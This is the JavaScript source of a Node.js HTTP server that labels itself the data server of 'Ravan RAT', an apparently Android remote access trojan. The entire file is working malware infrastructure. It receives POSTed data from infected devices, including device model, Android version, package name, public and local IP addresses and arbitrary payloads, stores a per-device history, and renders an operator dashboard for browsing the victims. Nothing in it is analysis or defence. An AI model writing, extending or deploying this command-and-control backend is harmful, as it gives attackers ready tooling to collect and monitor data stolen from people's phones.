const http = require('http');
const url = require('url');

const devices = {};

function safeHtml(value) {
  if (value === null || value === undefined) {
    return '';
  }
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function formatTimestamp(timestamp) {
  if (!timestamp) return 'N/A';
  return new Date(Number(timestamp)).toLocaleString();
}

function renderHomePage() {
  let html = '<!DOCTYPE html><html><head><meta charset="utf-8"/><title>Ravan RAT Data Server</title>' +
    '<style>body{font-family:system-ui,Segoe UI,Roboto,Ubuntu,sans-serif;background:#111;color:#eee;margin:0;padding:0}header{padding:24px;text-align:center;background:#1f1f1f;border-bottom:1px solid #333}main{padding:24px}table{width:100%;border-collapse:collapse;margin-top:16px}th,td{padding:12px;border:1px solid #333;text-align:left}th{background:#222}tr:hover{background:rgba(255,255,255,0.04)}.device-link{color:#7ed6df;text-decoration:none}</style></head><body>' +
    '<header><h1>Ravan RAT Data Server</h1><p>Listening for /api/data POST requests</p></header><main>';

  const deviceIds = Object.keys(devices);
  if (deviceIds.length === 0) {
    html += '<p>No device data received yet.</p>';
  } else {
    html += '<table><thead><tr><th>Device ID</th><th>Model</th><th>Public IP</th><th>Local IP</th><th>Last Update</th><th>Records</th></tr></thead><tbody>';
    deviceIds.forEach(deviceId => {
      const device = devices[deviceId];
      html += '<tr>' +
        '<td><a class="device-link" href="/device/' + encodeURIComponent(deviceId) + '">' + safeHtml(deviceId) + '</a></td>' +
        '<td>' + safeHtml(device.deviceModel) + '</td>' +
        '<td>' + safeHtml(device.publicIp) + '</td>' +
        '<td>' + safeHtml(device.localIp) + '</td>' +
        '<td>' + formatTimestamp(device.lastUpdate) + '</td>' +
        '<td>' + safeHtml(device.history.length) + '</td>' +
        '</tr>';
    });
    html += '</tbody></table>';
  }

  html += '</main></body></html>';
  return html;
}

function renderDevicePage(deviceId) {
  const device = devices[deviceId];
  if (!device) {
    return '<!DOCTYPE html><html><head><meta charset="utf-8"/><title>Unknown Device</title></head><body><h1>Device Not Found</h1></body></html>';
  }

  let html = '<!DOCTYPE html><html><head><meta charset="utf-8"/><title>Ravan Device ' + safeHtml(deviceId) + '</title>' +
    '<style>body{font-family:system-ui,Segoe UI,Roboto,Ubuntu,sans-serif;background:#111;color:#eee;margin:0;padding:0}header{padding:24px;text-align:center;background:#1f1f1f;border-bottom:1px solid #333}main{padding:24px}section{margin-bottom:24px}pre{white-space:pre-wrap;word-break:break-word;background:#141414;padding:16px;border-radius:12px;border:1px solid #333;color:#dcdcdc}table{width:100%;border-collapse:collapse;margin-top:16px}th,td{padding:12px;border:1px solid #333;text-align:left}th{background:#222}tr:hover{background:rgba(255,255,255,0.04)}.back-link{color:#7ed6df;text-decoration:none}</style></head><body>' +
    '<header><h1>Device: ' + safeHtml(deviceId) + '</h1><p>Last update: ' + formatTimestamp(device.lastUpdate) + '</p><p><a class="back-link" href="/">← Back to devices</a></p></header><main>';

  html += '<section><h2>Device Info</h2><pre>' + safeHtml(JSON.stringify({
    deviceId: deviceId,
    deviceModel: device.deviceModel,
    manufacturer: device.manufacturer,
    androidVersion: device.androidVersion,
    sdkInt: device.sdkInt,
    packageName: device.packageName,
    publicIp: device.publicIp,
    localIp: device.localIp,
    timestamp: device.lastUpdate
  }, null, 2)) + '</pre></section>';

  html += '<section><h2>Latest Payload</h2><pre>' + safeHtml(JSON.stringify(device.latestPayload, null, 2)) + '</pre></section>';

  html += '<section><h2>History (' + device.history.length + ')</h2>';
  device.history.slice(0, 10).forEach((entry, index) => {
    html += '<div style="margin-bottom:16px"><strong>Update #' + (index + 1) + ' - ' + formatTimestamp(entry.timestamp) + '</strong><pre>' + safeHtml(JSON.stringify(entry, null, 2)) + '</pre></div>';
  });
  html += '</section>';

  html += '</main></body></html>';
  return html;
}

function handleApiData(req, res) {
  let body = '';
  req.on('data', chunk => {
    body += chunk;
    if (body.length > 1e7) {
      res.writeHead(413, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Payload too large' }));
      req.connection.destroy();
    }
  });

  req.on('end', () => {
    try {
      const payload = JSON.parse(body || '{}');
      const deviceId = payload.deviceId || 'unknown';
      if (!devices[deviceId]) {
        devices[deviceId] = {
          deviceModel: payload.deviceModel || '',
          manufacturer: payload.manufacturer || '',
          androidVersion: payload.androidVersion || '',
          sdkInt: payload.sdkInt || '',
          packageName: payload.packageName || '',
          publicIp: payload.publicIp || '',
          localIp: payload.localIp || '',
          lastUpdate: Date.now(),
          latestPayload: payload,
          history: []
        };
      }

      const device = devices[deviceId];
      device.deviceModel = payload.deviceModel || device.deviceModel;
      device.manufacturer = payload.manufacturer || device.manufacturer;
      device.androidVersion = payload.androidVersion || device.androidVersion;
      device.sdkInt = payload.sdkInt || device.sdkInt;
      device.packageName = payload.packageName || device.packageName;
      device.publicIp = payload.publicIp || device.publicIp;
      device.localIp = payload.localIp || device.localIp;
      device.lastUpdate = Date.now();
      device.latestPayload = payload;
      device.history.unshift(payload);
      if (device.history.length > 50) {
        device.history.length = 50;
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    } catch (error) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: error.message }));
    }
  });
}

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;

  if (req.method === 'POST' && pathname === '/api/data') {
    return handleApiData(req, res);
  }

  if (req.method === 'GET' && pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(renderHomePage());
    return;
  }

  if (req.method === 'GET' && pathname.startsWith('/device/')) {
    const deviceId = decodeURIComponent(pathname.replace('/device/', ''));
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(renderDevicePage(deviceId));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ success: false, error: 'Not found' }));
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`Ravan RAT data server listening on port ${PORT}`);
});
